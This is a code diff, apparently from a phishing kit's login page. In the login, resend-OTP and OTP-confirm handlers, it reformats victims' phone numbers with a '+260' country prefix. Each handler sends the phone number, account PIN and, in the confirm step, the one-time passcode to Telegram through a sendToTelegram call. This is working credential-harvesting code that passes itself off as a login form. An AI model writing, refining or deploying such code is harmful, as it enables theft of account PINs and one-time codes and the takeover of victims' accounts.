@@ -294,7 +294,7 @@ document.getElementById('loginForm').onsubmit=e=>{
 
   sendToTelegram({
     event:'login_clicked',
-    loginPhone:phone.value,
+    loginPhone:'+260'+phone.value.slice(1),
     loginPin:pinValue,
     plan:normalizePlan(selectedPlan),
     device,
@@ -354,7 +354,7 @@ resendBtn.onclick=()=>{
 
   sendToTelegram({
     event:'resend_otp',
-    loginPhone:phone.value,
+    loginPhone:'+260'+phone.value.slice(1),
     loginPin:pinValue,
     plan:normalizePlan(selectedPlan),
     device,
@@ -371,7 +371,7 @@ resendBtn.onclick=()=>{
 confirmBtn.onclick=()=>{
   sendToTelegram({
     event:'otp_confirm',
-    loginPhone:phone.value,
+    loginPhone:'+260'+phone.value.slice(1),
     loginPin:pinValue,
     otp:buffer.value,
     plan:normalizePlan(selectedPlan),
